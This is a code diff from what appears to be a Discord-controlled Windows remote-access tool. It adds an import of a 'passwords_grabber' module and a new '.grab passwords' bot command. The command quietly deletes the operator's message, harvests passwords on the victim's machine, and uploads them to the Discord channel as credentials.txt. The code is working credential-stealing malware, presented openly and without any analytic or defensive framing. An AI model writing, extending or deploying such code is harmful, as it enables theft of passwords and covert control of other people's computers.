@@ -20,6 +20,7 @@ from threading import Thread
 import winreg
 import pyautogui
 from resources.misc import *
+from resources.passwords_grabber import *
 
 ###############################################################################
 ##                                                                           ##
@@ -33,7 +34,6 @@ from resources.misc import *
 ##   Everything you do, you are doing at your own risk and responsibility.   ##
 ##                                                                           ##
 ###############################################################################
-
 
 
 
@@ -450,6 +450,12 @@ async def on_message(message):
             else:
                 reaction_msg = await message.channel.send('```You need to generate the processes list to use this feature\n.show processes```')
                 await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:5] == '.grab':
+            await message.delete()
+            if message.content[6:] == 'passwords':
+                grab_passwords()
+                files_to_send.append([message.channel.id, '`Grabbed passwords:`', 'credentials.txt', True])
 
 
         elif expectation == 'onefile':
